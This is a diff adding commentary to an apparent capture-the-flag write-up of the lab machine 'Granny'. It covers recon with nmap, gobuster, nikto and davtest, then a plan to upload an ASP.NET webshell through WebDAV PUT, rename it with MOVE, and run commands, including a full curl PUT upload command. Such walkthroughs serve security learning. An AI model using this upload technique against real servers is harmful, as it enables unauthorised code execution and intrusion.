@@ -29,8 +29,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Apr 18 17:21:30 2019 -- 1 IP address (1 host up) scanned in 115.01 seconds
 ```
 
+Looks like this box is running very ld version of IIS, which means that the version of windows running here itself is also probably very old. Interestingly enough, there are a lot of enabled HTTP options enabled, most notably `PUT` and `MOVE`, which may allow us to upload files for execution. WebDAV is also present.
+
 ### Gobuster
 
+`gobuster -w /usr/share/dirb/wordlists/common.txt`
 ```
 /_private (Status: 301)
 /_vti_bin (Status: 301)
@@ -43,8 +46,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 /Images (Status: 301)
 ```
 
+Gobuster yields a couple interesting directories. However, access is denied for most of them. It's worth noting that the server does run with ASP.NET, so there is the possibility of getting some sort of web shell.
+
 ### Nikto
 
+
+`nikto granny.htb`
 ```
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -93,8 +100,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 + 1 host(s) tested
 ```
 
+Continuing enumeration, Nikto confirms that the `PUT` method can be used to upload files. Evertything else seems to be a repeat of our previous recon.
+
 ### Davtest
 
+Because WebDAV is enabled, I like to do a scan with `davtest`, a quick scanning tool that tests HTTP options. In our case, the `PUT` method is tested.
+
+`davtest -url http://granny.htb -cleanup`
 ```
 ********************************************************
  Testing DAV connection
@@ -141,8 +153,24 @@ Executes: http://granny.htb/DavTestDir_DcKtLl4hiHEKy/davtest_DcKtLl4hiHEKy.txt
 Executes: http://granny.htb/DavTestDir_DcKtLl4hiHEKy/davtest_DcKtLl4hiHEKy.html
 ```
 
+Looks like we can upload a number of file types. Because we know that the http methods `PUT` and `MOVE` are enabled, we can upload an ASP.NET webshell with `PUT` with a .txt file extension, and change the file extension after upload with the `MOVE` method. Then simply browsing to the file should get us command execution.
+
 Getting User
 ------------
+
+If we use burp to proxy the request sent by `davtest`, we can get an idea of how the HTTP request is constructed.
+
+![davtest](images/put.png)
+
+Using `curl` we can reconstruct the request:
+
+`curl -X PUT -T 'test.txt' -H 'TE: deflate,gzip;q=0.3' -H 'Connection:close' -H 'Host: localhost:80' -A 'DAV.pm/v0.49' granny.htb -v`
+
+Where `test.txt` is the name of our ASP.NET webshell
+
+Getting Root
+------------
+
 
 ### MSF Privesc
 
@@ -172,10 +200,4 @@ netstat -nao | findstr LISTENING
   TCP    10.10.10.15:139        0.0.0.0:0              LISTENING       4
   TCP    127.0.0.1:1028         0.0.0.0:0              LISTENING       1884
 ```
-
-Getting Root
-------------
-
-
-
 
